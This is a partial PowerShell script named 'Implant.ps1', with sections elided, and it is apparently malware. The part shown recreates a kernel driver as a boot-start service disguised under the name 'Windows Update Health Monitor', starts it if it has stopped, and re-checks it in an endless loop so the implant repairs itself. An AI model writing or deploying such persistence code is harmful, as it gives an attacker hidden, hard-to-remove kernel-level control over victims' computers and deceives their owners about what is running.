# Implant.ps1 - FULL DEBUG VERSION WITH PERMANENT DRIVER SELF-REPAIR
...
function Ensure-DriverService {
    ...
    if (-not $svc) {
        Write-Host "[+] Service missing - recreating as boot-start..." -ForegroundColor Yellow
        sc.exe create $ServiceName type= kernel start= boot binPath= $DriverPath DisplayName= "Windows Update Health Monitor" > $null 2>&1
    }
    
    if ((sc.exe query $ServiceName | Select-String "RUNNING") -eq $null) {
        Write-Host "[+] Driver not running - starting now..." -ForegroundColor Yellow
        sc.exe start $ServiceName > $null 2>&1
    }
    
    Write-Host "[+] Driver service verified running" -ForegroundColor Green
}

Ensure-DriverService
# ======================================================================
...
while ($true) {
    try {
        ...
        # Keep driver alive (self-repair again)
        Ensure-DriverService
